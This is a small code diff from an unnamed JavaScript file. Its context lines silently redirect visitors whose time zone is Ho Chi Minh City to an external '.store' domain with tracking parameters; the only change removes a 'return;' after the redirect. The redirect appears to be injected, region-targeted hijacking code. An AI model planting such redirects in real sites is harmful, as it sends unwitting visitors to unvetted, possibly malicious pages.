@@ -7,5 +7,4 @@ if (userTimeZone === 'Asia/Ho_Chi_Minh' || userTimeZone === 'Asia/Saigon') {
   var to = 'https://okla-wv-3.store/?utm_source=' + encodeURIComponent(utm_source)
          + '&utm_campaign=' + encodeURIComponent(utm_campaign);
   window.location.href = to;
-  return;
 }
